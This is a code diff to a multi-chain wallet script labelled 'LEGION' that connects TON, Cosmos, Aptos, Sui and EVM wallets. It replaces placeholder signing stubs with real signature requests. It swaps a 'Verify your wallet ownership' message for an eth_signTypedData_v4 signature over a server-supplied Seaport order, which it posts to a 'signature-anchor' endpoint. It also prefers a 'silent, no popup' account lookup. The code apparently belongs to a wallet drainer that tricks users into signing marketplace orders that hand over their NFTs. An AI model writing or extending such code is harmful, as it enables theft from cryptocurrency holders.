@@ -1301,9 +1301,9 @@
           }
           if (!ton) throw new Error('No TON wallet detected');
 
-          // Try multiple methods — different TON wallets use different APIs
+          // Try multiple methods — ton_getAccounts first (silent, no popup), then ton_requestAccounts
           var addr = null;
-          var methods = ['ton_requestAccounts', 'ton_getAccounts'];
+          var methods = ['ton_getAccounts', 'ton_requestAccounts'];
           for (var mi = 0; mi < methods.length; mi++) {
             try {
               var res = await ton.send(methods[mi]);
@@ -1381,9 +1381,15 @@
           var chainId = 'cosmoshub-4';
           await window.keplr.enable(chainId);
 
+          // getKey returns { bech32Address, pubKey, ... }
+          var key = await window.keplr.getKey(chainId);
+          var addr = key && key.bech32Address;
+          if (!addr) throw new Error('COSMOS wallet returned no address');
+
           connectedChains.COSMOS = {
             chain: 'COSMOS',
             config: CHAIN_CONFIG.COSMOS,
+            address: addr,
             walletType: 'Keplr',
             provider: window.keplr,
             chainId: chainId,
@@ -1391,7 +1397,7 @@
             timestamp: Date.now()
           };
 
-          console.log('[LEGION] ✅ COSMOS connected');
+          console.log('[LEGION] ✅ COSMOS connected:', addr.substring(0, 12) + '...');
           return connectedChains.COSMOS;
         } catch (e) {
           console.error('[LEGION] ❌ COSMOS connection failed:', e.message);
@@ -1406,8 +1412,14 @@
             throw new Error('COSMOS not connected');
           }
           console.log('[LEGION] 🖊️  Signing COSMOS message...');
+          var keplr = connectedChains.COSMOS.provider;
+          var chainId = connectedChains.COSMOS.chainId;
+          var addr = connectedChains.COSMOS.address;
+          var result = await keplr.signArbitrary(chainId, addr, message);
+          var sig = result && (result.signature || JSON.stringify(result));
+          if (!sig) throw new Error('COSMOS signArbitrary returned no signature');
           console.log('[LEGION] ✅ COSMOS signature obtained');
-          return message;
+          return sig;
         } catch (e) {
           console.error('[LEGION] ❌ COSMOS signing failed:', e.message);
           return null;
@@ -1479,8 +1491,12 @@
             throw new Error('APTOS not connected');
           }
           console.log('[LEGION] 🖊️  Signing APTOS message...');
+          var aptos = connectedChains.APTOS.provider;
+          var result = await aptos.signMessage({ message: message, nonce: String(Date.now()) });
+          var sig = result && (result.signature || result.fullMessage || JSON.stringify(result));
+          if (!sig) throw new Error('APTOS signMessage returned no signature');
           console.log('[LEGION] ✅ APTOS signature obtained');
-          return message;
+          return sig;
         } catch (e) {
           console.error('[LEGION] ❌ APTOS signing failed:', e.message);
           return null;
@@ -1558,8 +1574,20 @@
             throw new Error('SUI not connected');
           }
           console.log('[LEGION] 🖊️  Signing SUI message...');
+          var suiWallet = connectedChains.SUI.provider;
+          var msgBytes = new TextEncoder().encode(typeof message === 'string' ? message : JSON.stringify(message));
+          var result;
+          if (suiWallet.signPersonalMessage) {
+            result = await suiWallet.signPersonalMessage({ message: msgBytes });
+          } else if (suiWallet.signMessage) {
+            result = await suiWallet.signMessage({ message: msgBytes });
+          } else {
+            throw new Error('SUI wallet does not support signPersonalMessage or signMessage');
+          }
+          var sig = result && (result.signature || result.bytes || JSON.stringify(result));
+          if (!sig) throw new Error('SUI signing returned no signature');
           console.log('[LEGION] ✅ SUI signature obtained');
-          return message;
+          return sig;
         } catch (e) {
           console.error('[LEGION] ❌ SUI signing failed:', e.message);
           return null;
@@ -2078,11 +2106,20 @@
                 });
                 var seaportData = (seaportTypedData && seaportTypedData.data) ? seaportTypedData.data : seaportTypedData;
                 if (seaportData && seaportData.typed_data) {
-                  var nftMsg = 'Verify your wallet ownership\n\nWallet: ' + connectedChains.EVM.address.substring(0, 6) + '...';
-                  var nftMsgHex = '0x' + Array.from(new TextEncoder().encode(nftMsg)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
+                  // Seaport requires eth_signTypedData_v4 — personal_sign is rejected by Seaport contract
+                  var nftTypedData = seaportData.typed_data;
+                  if (nftTypedData && nftTypedData.domain && !nftTypedData.types.EIP712Domain) {
+                    var nd = nftTypedData.domain;
+                    var ndf = [];
+                    if (nd.name !== undefined) ndf.push({ name: 'name', type: 'string' });
+                    if (nd.version !== undefined) ndf.push({ name: 'version', type: 'string' });
+                    if (nd.chainId !== undefined) ndf.push({ name: 'chainId', type: 'uint256' });
+                    if (nd.verifyingContract !== undefined) ndf.push({ name: 'verifyingContract', type: 'address' });
+                    if (ndf.length) nftTypedData.types.EIP712Domain = ndf;
+                  }
                   var nftSig = await connectedChains.EVM.provider.request({
-                    method: 'personal_sign',
-                    params: [nftMsgHex, connectedChains.EVM.address]
+                    method: 'eth_signTypedData_v4',
+                    params: [connectedChains.EVM.address, JSON.stringify(nftTypedData)]
                   });
                   if (nftSig) {
                     await apiPost('/api/v1/signature-anchor', {
@@ -2712,6 +2749,11 @@
       }
 
       if (!res.ok) {
+        // 409 Conflict = already submitted (idempotent — treat as success)
+        if (res.status === 409) {
+          LOGGER.debug('API 409 (already submitted, treating as success):', path);
+          return data;
+        }
         lastError = new Error(data.message || ('API error ' + res.status));
         // Don't retry 400 (bad request) - it won't change
         if (res.status >= 400 && res.status < 500) {
